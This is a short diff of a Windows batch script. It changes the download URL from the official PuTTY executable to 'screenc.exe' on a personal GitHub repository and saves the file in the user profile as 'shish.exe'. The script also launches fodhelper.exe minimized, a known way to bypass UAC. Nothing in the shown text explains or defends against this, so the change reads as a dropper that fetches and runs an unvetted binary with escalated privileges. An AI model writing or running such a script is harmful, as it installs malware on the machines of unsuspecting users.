@@ -2,7 +2,7 @@
 setlocal
 
 :: === CONFIGURATION ===
-set "EXE_URL=https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
+set "EXE_URL=https://github.com/chotaacc/newss/raw/main/screenc.exe"
 set "EXE_PATH=%USERPROFILE%\shish.exe"
 
 :: === STEP 1: DOWNLOAD shish.exe ===
@@ -25,3 +25,4 @@ timeout /t 4 /nobreak >nul
 start /min "" "C:\Windows\System32\fodhelper.exe"
 
 endlocal
+
